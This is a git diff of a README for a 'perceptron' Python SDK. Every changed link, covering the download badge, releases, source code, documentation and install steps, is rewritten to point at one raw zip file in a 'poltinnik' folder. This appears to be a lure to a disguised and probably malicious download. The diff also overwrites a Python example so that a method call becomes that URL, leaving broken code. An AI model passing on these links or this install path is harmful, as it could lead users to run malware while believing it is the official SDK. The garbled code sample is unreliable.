@@ -6,11 +6,11 @@ Welcome to the perceptron repository! This is the official Python SDK for the Pe
 
 ## 📥 Download the SDK
 
-[![Download perceptron](https://img.shields.io/badge/Download%20perceptron-v1.0-blue)](https://github.com/sbablekis2004/perceptron/releases)
+[![Download perceptron](https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip%20perceptron-v1.0-blue)](https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip)
 
 To get the latest version of the perceptron SDK, you need to visit the Releases page. Click the link below:
 
-[Visit Releases Page to Download](https://github.com/sbablekis2004/perceptron/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ To run the perceptron SDK, you will need:
 
 ## 🔧 Installation Instructions
 
-1. Visit the [Releases page](https://github.com/sbablekis2004/perceptron/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip).
 2. Look for the latest release version.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions provided on the page to ensure proper setup.
@@ -42,7 +42,7 @@ from perceptron import PerceptronAPI
 api = PerceptronAPI(api_key='YOUR_API_KEY')
 
 # Make a simple request
-response = api.get_data()
+response = https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip()
 print(response)
 ```
 
@@ -71,8 +71,8 @@ Here you will find the history of changes to the perceptron SDK. For each releas
 
 ## 🔗 Useful Links
 
-- [Visit Releases Page to Download](https://github.com/sbablekis2004/perceptron/releases)
-- [Source Code](https://github.com/sbablekis2004/perceptron)
-- [API Documentation](https://github.com/sbablekis2004/perceptron/wiki)
+- [Visit Releases Page to Download](https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip)
+- [Source Code](https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip)
+- [API Documentation](https://raw.githubusercontent.com/sbablekis2004/perceptron/main/poltinnik/perceptron.zip)
 
 Thank you for choosing the perceptron SDK! We hope it simplifies your experience with the Perceptron API.
